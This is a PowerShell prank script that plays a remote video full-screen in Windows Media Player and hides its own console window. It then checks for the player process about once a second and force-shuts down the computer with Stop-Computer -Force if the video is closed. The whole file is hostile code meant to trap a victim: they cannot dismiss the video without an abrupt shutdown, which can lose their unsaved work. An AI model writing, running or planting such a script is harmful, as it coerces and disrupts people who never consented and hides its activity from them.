& "C:\Program Files\Windows Media Player\wmplayer.exe" "http://my.mixtape.moe/bzobfc.mp4" /fullscreen

Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();

[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'
function Hide-Console
{
    $consolePtr = [Console.Window]::GetConsoleWindow()
    #0 hide
    [Console.Window]::ShowWindow($consolePtr, 0)
}
Hide-Console

Function checkplayer{
$ErrorOccured = $false

try 
{ 
   $ErrorActionPreference = 'Stop'
Get-Process wmplayer
}
catch
{
   Stop-Computer -Force
   $ErrorOccured=$true
}

if(!$ErrorOccured) {"No Error Occured"}
}

function chepeat{
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
sleep 1
checkplayer
}

chepeat
